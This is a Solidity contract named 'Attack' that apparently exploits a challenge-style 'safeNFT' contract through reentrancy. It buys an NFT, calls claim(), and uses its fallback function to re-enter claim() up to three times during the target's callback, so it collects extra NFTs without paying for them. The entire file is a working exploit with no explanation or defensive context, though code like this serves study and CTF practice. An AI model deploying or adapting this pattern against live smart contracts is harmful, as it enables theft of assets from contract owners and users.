// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IsafeNFT {
    function canClaim(address) external view returns (bool);

    function buyNFT() external payable;

    function claim() external;
}

contract Attack {
    IsafeNFT safeNftContract;
    uint256 public counter;

    constructor(address _safeNftAddress) {
        safeNftContract = IsafeNFT(_safeNftAddress);
    }

    function buyNFT() public payable {
        safeNftContract.buyNFT{value: msg.value}();
    }

    function claimAttack() public {
        safeNftContract.claim();
    }

    fallback() external {
        counter++;
        if (counter <= 3) {
            safeNftContract.claim();
        }
    }

    receive() external payable {}
}